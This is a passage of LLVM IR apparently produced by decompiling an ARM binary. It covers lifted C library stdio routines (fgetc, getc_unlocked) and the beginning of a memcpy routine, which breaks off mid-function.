  %v0_1a1d0 = phi i32 [ -1, %bb257 ], [ %v2_1a1b4, %dec_label_pc_1a1b0 ]
  store i32 %v0_1a1d0, i32* %r0.global-to-local, align 4
  store i32 %v27_19a0c, i32* @lr, align 4
  ret i32 %v0_1a1d0

; uselistorder directives
  uselistorder i32 %v0_1a1d0, { 1, 0 }
  uselistorder i32 %v1_1a1b0, { 1, 0 }
  uselistorder i32 %v1_1a1a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1a188, { 2, 1, 0 }
  uselistorder i32 %v3_1a128, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a0f0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1a0e4, { 1, 2, 0 }
  uselistorder i32 %v0_1a0e4, { 1, 0 }
  uselistorder i32 %v1_1a0ec.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1a0a4, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1a0a0, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_1a064, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1a02c, { 1, 0 }
  uselistorder i32 %v1_1a02c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a028, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_19f88, { 2, 1, 0 }
  uselistorder i32 %v2_19f08, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_19ef8, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_19ee4, { 1, 0, 2 }
  uselistorder i32 %v5_19ee0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19f7030, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_19e98, { 1, 0 }
  uselistorder i32 %v1_19e90, { 1, 2, 0 }
  uselistorder i32 %v2_19e84, { 1, 0 }
  uselistorder i32 %v1_19e84, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19e84, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_19e54, { 1, 0 }
  uselistorder i32 %v0_19e54, { 0, 2, 1 }
  uselistorder i32 %v2_19e50, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_19e3c, { 1, 0 }
  uselistorder i1 %v2_19e2c, { 1, 0 }
  uselistorder i32 %v1_19e28, { 3, 2, 1, 0 }
  uselistorder i32 %v2_19e24, { 1, 0 }
  uselistorder i1 %v2_19e14, { 1, 0 }
  uselistorder i32 %v1_19e08, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_19dbc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19dbc, { 1, 0, 2 }
  uselistorder i1 %v2_19da4, { 1, 0 }
  uselistorder i32 %v5_19d8c, { 1, 0 }
  uselistorder i32 %v0_19d78, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19d60, { 1, 2, 0 }
  uselistorder i32 %v2_19d5c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_19cf4, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_19c9c, { 1, 0 }
  uselistorder double %v2_19c60, { 1, 0 }
  uselistorder i32 %v0_19c1c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_19c10, { 1, 0 }
  uselistorder i32 %v2_19c4c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_19be0, { 1, 0 }
  uselistorder i32 %v5_19b9c, { 1, 0 }
  uselistorder i32 %v1_19abc.v0_19aa85, { 1, 0 }
  uselistorder i32 %v3_19b78, { 1, 0 }
  uselistorder i32 %v0_19b54, { 0, 2, 3, 1 }
  uselistorder i32 %v2_19b3c, { 2, 1, 0 }
  uselistorder i32 %v0_19b20, { 1, 0 }
  uselistorder i32 %v0_19a40, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 14, 17, 15, 16, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 3, 9, 10, 16, 20, 19, 17, 11, 12, 18, 13, 14, 4, 21, 15, 2, 22, 23, 38, 1, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 61, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 60, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10, 14 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5, 6 }
  uselistorder i32 57, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34432), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -34456), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_1a1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1a180, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1a0e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a058, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a028, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1a000, { 1, 0 }
  uselistorder label %dec_label_pc_19fd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19fb0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19f80, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19ec8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19eb8, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_19de0, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19cec, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_19c9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19c94, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_19b78, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_19a94, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a200 = load i32, i32* @r4, align 4
  store i32 %v3_1a200, i32* %stack_var_-16, align 4
  %v6_1a200 = load i32, i32* @r5, align 4
  %v12_1a200 = load i32, i32* @lr, align 4
  %v1_1a204 = add i32 %arg1, 52
  %v2_1a204 = inttoptr i32 %v1_1a204 to i32*
  %v3_1a204 = load i32, i32* %v2_1a204, align 4
  %v2_1a20c = icmp eq i32 %v3_1a204, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_1a20c, label %dec_label_pc_1a244, label %dec_label_pc_1a220

dec_label_pc_1a220:                               ; preds = %entry
  %v1_1a220 = add i32 %arg1, 16
  %v2_1a220 = inttoptr i32 %v1_1a220 to i32*
  %v3_1a220 = load i32, i32* %v2_1a220, align 4
  %v1_1a224 = add i32 %arg1, 24
  %v2_1a224 = inttoptr i32 %v1_1a224 to i32*
  %v3_1a224 = load i32, i32* %v2_1a224, align 4
  %v3_1a228 = icmp ult i32 %v3_1a220, %v3_1a224
  br i1 %v3_1a228, label %.thread, label %dec_label_pc_1a238

.thread:                                          ; preds = %dec_label_pc_1a220
  %v2_1a22c = inttoptr i32 %v3_1a220 to i8*
  %v3_1a22c = load i8, i8* %v2_1a22c, align 1
  %v4_1a22c = zext i8 %v3_1a22c to i32
  store i32 %v4_1a22c, i32* %r4.global-to-local, align 4
  %v6_1a22c = add i32 %v3_1a220, 1
  store i32 %v6_1a22c, i32* %v2_1a220, align 4
  br label %dec_label_pc_1a2b8

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a220
  %v1_1a238 = inttoptr i32 %arg1 to i16*
  %v2_1a238 = call i32 @getc_unlocked(i16* %v1_1a238)
  store i32 %v2_1a238, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a2b8

dec_label_pc_1a244:                               ; preds = %entry
  %v1_1a248 = add i32 %arg1, 56
  store i32 %v1_1a248, i32* @r4, align 4
  %v4_1a25c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1a25c)
  %v0_1a270 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a270 = add i32 %v0_1a270, 16
  %v3_1a270 = inttoptr i32 %v2_1a270 to i32*
  %v4_1a270 = load i32, i32* %v3_1a270, align 4
  store i32 107132, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a270)
  %v0_1a27c = load i32, i32* @r5, align 4
  %v1_1a27c = add i32 %v0_1a27c, 16
  %v2_1a27c = inttoptr i32 %v1_1a27c to i32*
  %v3_1a27c = load i32, i32* %v2_1a27c, align 4
  %v1_1a280 = add i32 %v0_1a27c, 24
  %v2_1a280 = inttoptr i32 %v1_1a280 to i32*
  %v3_1a280 = load i32, i32* %v2_1a280, align 4
  %v3_1a284 = icmp ult i32 %v3_1a27c, %v3_1a280
  br i1 %v3_1a284, label %.thread2, label %dec_label_pc_1a294

.thread2:                                         ; preds = %dec_label_pc_1a244
  %v2_1a288 = inttoptr i32 %v3_1a27c to i8*
  %v3_1a288 = load i8, i8* %v2_1a288, align 1
  %v4_1a288 = zext i8 %v3_1a288 to i32
  store i32 %v4_1a288, i32* %r4.global-to-local, align 4
  %v6_1a288 = add i32 %v3_1a27c, 1
  store i32 %v6_1a288, i32* %v2_1a27c, align 4
  br label %dec_label_pc_1a2a0

dec_label_pc_1a294:                               ; preds = %dec_label_pc_1a244
  %v1_1a298 = inttoptr i32 %v0_1a27c to i16*
  %v2_1a298 = call i32 @getc_unlocked(i16* %v1_1a298)
  store i32 %v2_1a298, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1a2a0

dec_label_pc_1a2a0:                               ; preds = %.thread2, %dec_label_pc_1a294
  %v0_1a2ac = load i32, i32* %r6.global-to-local, align 4
  %v2_1a2ac = add i32 %v0_1a2ac, 24
  %v3_1a2ac = inttoptr i32 %v2_1a2ac to i32*
  %v4_1a2ac = load i32, i32* %v3_1a2ac, align 4
  store i32 %v4_1a2ac, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1a2ac)
  br label %dec_label_pc_1a2b8

dec_label_pc_1a2b8:                               ; preds = %.thread, %dec_label_pc_1a238, %dec_label_pc_1a2a0
  %v0_1a2b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a2c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a2c0, i32* @r4, align 4
  store i32 %v6_1a200, i32* @r5, align 4
  store i32 %v12_1a200, i32* @lr, align 4
  ret i32 %v0_1a2b8

; uselistorder directives
  uselistorder i32 %v3_1a27c, { 1, 0, 2 }
  uselistorder i32 %v3_1a220, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 2, 0, 4, 3, 5, 1 }
  uselistorder label %dec_label_pc_1a2b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a2a0, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1a2dc = load i32, i32* @r4, align 4
  store i32 %v3_1a2dc, i32* %stack_var_-12, align 4
  %v6_1a2dc = load i32, i32* @r5, align 4
  %v9_1a2dc = load i32, i32* @lr, align 4
  %v0_1a2e0 = load i32, i32* @r0, align 4
  %v1_1a2e0 = add i32 %v0_1a2e0, 16
  %v2_1a2e0 = inttoptr i32 %v1_1a2e0 to i32*
  %v3_1a2e0 = load i32, i32* %v2_1a2e0, align 4
  store i32 %v3_1a2e0, i32* %r2.global-to-local, align 4
  %v1_1a2e4 = add i32 %v0_1a2e0, 24
  %v2_1a2e4 = inttoptr i32 %v1_1a2e4 to i32*
  %v3_1a2e4 = load i32, i32* %v2_1a2e4, align 4
  %v3_1a2e8 = icmp ult i32 %v3_1a2e0, %v3_1a2e4
  store i32 %v0_1a2e0, i32* @r4, align 4
  br i1 %v3_1a2e8, label %bb, label %dec_label_pc_1a308

bb:                                               ; preds = %entry
  %v2_1a2f4 = inttoptr i32 %v3_1a2e0 to i8*
  %v3_1a2f4 = load i8, i8* %v2_1a2f4, align 1
  %v4_1a2f4 = zext i8 %v3_1a2f4 to i32
  store i32 %v4_1a2f4, i32* %r0.global-to-local, align 4
  %v6_1a2f4 = add i32 %v3_1a2e0, 1
  store i32 %v6_1a2f4, i32* %r2.global-to-local, align 4
  store i32 %v6_1a2f4, i32* %v2_1a2e0, align 4
  br label %dec_label_pc_1a3f4

dec_label_pc_1a308:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  %v1_1a308 = inttoptr i32 %v0_1a2e0 to i16*
  %v2_1a308 = load i16, i16* %v1_1a308, align 2
  %v3_1a308 = zext i16 %v2_1a308 to i32
  %v1_1a30c = and i32 %v3_1a308, 131
  %tmp25 = icmp ugt i32 %v1_1a30c, 128
  br i1 %tmp25, label %dec_label_pc_1a328, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a308
  store i32 128, i32* @r1, align 4
  %v0_1a31c = call i32 @__stdio_trans2r_o()
  store i32 %v0_1a31c, i32* %r0.global-to-local, align 4
  %v2_1a320 = icmp eq i32 %v0_1a31c, 0
  br i1 %v2_1a320, label %dec_label_pc_1a318.dec_label_pc_1a328_crit_edge, label %dec_label_pc_1a3f0

dec_label_pc_1a318.dec_label_pc_1a328_crit_edge:  ; preds = %dec_label_pc_1a318
  %v0_1a328.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a328

dec_label_pc_1a328:                               ; preds = %dec_label_pc_1a318.dec_label_pc_1a328_crit_edge, %dec_label_pc_1a308
  %v2_1a368 = phi i32 [ %v0_1a328.pre, %dec_label_pc_1a318.dec_label_pc_1a328_crit_edge ], [ %v0_1a2e0, %dec_label_pc_1a308 ]
  %v1_1a328 = inttoptr i32 %v2_1a368 to i16*
  %v2_1a328 = load i16, i16* %v1_1a328, align 2
  %v3_1a328 = zext i16 %v2_1a328 to i32
  store i32 %v3_1a328, i32* %r2.global-to-local, align 4
  %v1_1a32c = and i32 %v3_1a328, 2
  %v2_1a32c = icmp eq i32 %v1_1a32c, 0
  br i1 %v2_1a32c, label %dec_label_pc_1a358, label %dec_label_pc_1a334

dec_label_pc_1a334:                               ; preds = %dec_label_pc_1a328
  %tmp26 = urem i16 %v2_1a328, 2
  %v1_1a334 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1a334
  %v4_1a338 = and i32 %tmp22, 4
  %v5_1a338 = add i32 %v4_1a338, %v2_1a368
  %v1_1a33c = add i32 %v5_1a338, 36
  %v2_1a33c = inttoptr i32 %v1_1a33c to i8*
  %v3_1a33c = load i8, i8* %v2_1a33c, align 1
  %v4_1a33c = zext i8 %v3_1a33c to i32
  %v1_1a340 = add nsw i32 %v3_1a328, -1
  store i32 %v1_1a340, i32* %r2.global-to-local, align 4
  store i32 %v4_1a33c, i32* %r0.global-to-local, align 4
  %v2_1a34c = add i32 %v2_1a368, 40
  %v3_1a34c = inttoptr i32 %v2_1a34c to i32*
  store i32 0, i32* %v3_1a34c, align 4
  %v0_1a350 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a350 = trunc i32 %v0_1a350 to i16
  %v2_1a350 = load i32, i32* @r4, align 4
  %v3_1a350 = inttoptr i32 %v2_1a350 to i16*
  store i16 %v1_1a350, i16* %v3_1a350, align 2
  br label %dec_label_pc_1a3f4

dec_label_pc_1a358:                               ; preds = %dec_label_pc_1a328
  %v1_1a358 = add i32 %v2_1a368, 16
  %v1_1a35c = inttoptr i32 %v1_1a358 to i32*
  %v2_1a35c = load i32, i32* %v1_1a35c, align 4
  %v3_1a35c = add i32 %v2_1a368, 20
  %v4_1a35c = inttoptr i32 %v3_1a35c to i32*
  %v5_1a35c = load i32, i32* %v4_1a35c, align 4
  %v9_1a360 = icmp eq i32 %v5_1a35c, %v2_1a35c
  br i1 %v9_1a360, label %dec_label_pc_1a370, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a358
  %v2_1a364 = inttoptr i32 %v2_1a35c to i8*
  %v3_1a364 = load i8, i8* %v2_1a364, align 1
  %v4_1a364 = zext i8 %v3_1a364 to i32
  store i32 %v4_1a364, i32* %r0.global-to-local, align 4
  %v6_1a364 = add i32 %v2_1a35c, 1
  store i32 %v6_1a364, i32* %v1_1a35c, align 4
  br label %dec_label_pc_1a3f4

dec_label_pc_1a370:                               ; preds = %dec_label_pc_1a358
  %v1_1a370 = add i32 %v2_1a368, 4
  %v2_1a370 = inttoptr i32 %v1_1a370 to i32*
  %v3_1a370 = load i32, i32* %v2_1a370, align 4
  %v7_1a374 = icmp eq i32 %v3_1a370, -2
  br i1 %v7_1a374, label %.thread7, label %dec_label_pc_1a388

.thread7:                                         ; preds = %dec_label_pc_1a370
  %v2_1a378 = or i16 %v2_1a328, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1a378, i16* %v1_1a328, align 2
  br label %dec_label_pc_1a3f4

dec_label_pc_1a388:                               ; preds = %dec_label_pc_1a370
  %v1_1a388 = and i32 %v3_1a328, 768
  %v2_1a388 = icmp eq i32 %v1_1a388, 0
  br i1 %v2_1a388, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_1a388
  %v1_1a390 = load i32, i32* @r5, align 4
  %v3_1a390 = add i32 %v1_1a390, 48
  %v4_1a390 = inttoptr i32 %v3_1a390 to i32*
  %v5_1a390 = load i32, i32* %v4_1a390, align 4
  store i32 %v5_1a390, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1a388, %bb23
  %v1_1a394 = xor i1 %v2_1a388, true
  call void @__pseudo_cond_branch(i1 %v1_1a394, i32 ptrtoint (i32* @global_var_14da4.846 to i32))
  %v0_1a398 = load i32, i32* @r4, align 4
  %v1_1a398 = add i32 %v0_1a398, 8
  store i32 %v1_1a398, i32* %r2.global-to-local, align 4
  %v1_1a39c = inttoptr i32 %v1_1a398 to i32*
  %v2_1a39c = load i32, i32* %v1_1a39c, align 4
  store i32 %v2_1a39c, i32* %r2.global-to-local, align 4
  %v3_1a39c = add i32 %v0_1a398, 12
  %v4_1a39c = inttoptr i32 %v3_1a39c to i32*
  %v5_1a39c = load i32, i32* %v4_1a39c, align 4
  %v9_1a3a0 = icmp eq i32 %v5_1a39c, %v2_1a39c
  br i1 %v9_1a3a0, label %dec_label_pc_1a3d4, label %dec_label_pc_1a3a8

dec_label_pc_1a3a8:                               ; preds = %.thread9
  %v2_1a3a8 = add i32 %v0_1a398, 24
  %v3_1a3a8 = inttoptr i32 %v2_1a3a8 to i32*
  store i32 %v2_1a39c, i32* %v3_1a3a8, align 4
  %v0_1a3ac = load i32, i32* @r4, align 4
  store i32 %v0_1a3ac, i32* %r0.global-to-local, align 4
  %v2_1a3b0 = call i32 @__stdio_rfill(i32 %v0_1a3ac)
  store i32 %v2_1a3b0, i32* %r0.global-to-local, align 4
  %v2_1a3b4 = icmp eq i32 %v2_1a3b0, 0
  br i1 %v2_1a3b4, label %dec_label_pc_1a3f0, label %dec_label_pc_1a3bc

dec_label_pc_1a3bc:                               ; preds = %dec_label_pc_1a3a8
  %v0_1a3bc = load i32, i32* @r4, align 4
  %v1_1a3bc = add i32 %v0_1a3bc, 20
  %v2_1a3bc = inttoptr i32 %v1_1a3bc to i32*
  %v3_1a3bc = load i32, i32* %v2_1a3bc, align 4
  %v2_1a3c0 = add i32 %v0_1a3bc, 24
  %v3_1a3c0 = inttoptr i32 %v2_1a3c0 to i32*
  store i32 %v3_1a3bc, i32* %v3_1a3c0, align 4
  %v0_1a3c4 = load i32, i32* @r4, align 4
  %v1_1a3c4 = add i32 %v0_1a3c4, 16
  %v2_1a3c4 = inttoptr i32 %v1_1a3c4 to i32*
  %v3_1a3c4 = load i32, i32* %v2_1a3c4, align 4
  %v1_1a3c8 = inttoptr i32 %v3_1a3c4 to i8*
  %v2_1a3c8 = load i8, i8* %v1_1a3c8, align 1
  %v3_1a3c8 = zext i8 %v2_1a3c8 to i32
  store i32 %v3_1a3c8, i32* %r0.global-to-local, align 4
  %v5_1a3c8 = add i32 %v3_1a3c4, 1
  store i32 %v5_1a3c8, i32* %v2_1a3c4, align 4
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3d4:                               ; preds = %.thread9
  %v1_1a3d4 = inttoptr i32 %v0_1a398 to i16*
  store i32 %v0_1a398, i32* %r0.global-to-local, align 4
  %v2_1a3d8 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1a3e0 = call i32 @__stdio_READ(i16* %v1_1a3d4, i32 %v2_1a3d8, i32 1)
  store i32 %v5_1a3e0, i32* %r0.global-to-local, align 4
  %v2_1a3e4 = icmp eq i32 %v5_1a3e0, 0
  br i1 %v2_1a3e4, label %dec_label_pc_1a3f0, label %bb24

bb24:                                             ; preds = %dec_label_pc_1a3d4
  %v4_1a3e8 = load i8, i8* %stack_var_-17, align 1
  %v5_1a3e8 = sext i8 %v4_1a3e8 to i32
  store i32 %v5_1a3e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3f0:                               ; preds = %dec_label_pc_1a3d4, %dec_label_pc_1a318, %dec_label_pc_1a3a8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3f4:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1a3bc, %dec_label_pc_1a334, %dec_label_pc_1a3f0
  %v2_1a3f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a3f8, i32* @r4, align 4
  store i32 %v6_1a2dc, i32* @r5, align 4
  store i32 %v9_1a2dc, i32* @lr, align 4
  %v1_1a3fc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a3fc

; uselistorder directives
  uselistorder i32 %v2_1a35c, { 1, 0, 2 }
  uselistorder i32 %v2_1a368, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_1a2e0, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_1a3f4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_1a3f0, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_1a410 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a410 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a410 = sub i32 %v0_1a410, %v1_1a410
  %v3_1a410 = icmp ult i32 %v0_1a410, %v1_1a410
  %v4_1a410 = xor i32 %v1_1a410, %v0_1a410
  %v5_1a410 = xor i32 %v2_1a410, %v0_1a410
  %v6_1a410 = and i32 %v5_1a410, %v4_1a410
  %v7_1a410 = icmp slt i32 %v6_1a410, 0
  store i1 %v7_1a410, i1* %cpsr_v.global-to-local, align 1
  %v8_1a410 = icmp slt i32 %v2_1a410, 0
  store i1 %v8_1a410, i1* %cpsr_n.global-to-local, align 1
  %v9_1a410 = icmp eq i32 %v0_1a410, %v1_1a410
  store i1 %v9_1a410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1a410, label %dec_label_pc_1a664, label %dec_label_pc_1a418

dec_label_pc_1a418:                               ; preds = %entry
  br i1 %v9_1a410, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_1a418
  %merge = phi i32 [ %v0_1a410, %dec_label_pc_1a418 ], [ %v2_1a6f8, %bb150 ], [ %v11_1a714, %bb153 ], [ %v7_1a714, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1a418
  %v5_1a41c = inttoptr i32 %v1_1a410 to i8*
  store i8* %v5_1a41c, i8** %stack_var_-8, align 4
  %v8_1a41c = load i32, i32* @lr, align 4
  %v0_1a420 = load i32, i32* @r2, align 4
  %v2_1a420 = add i32 %v0_1a420, -4
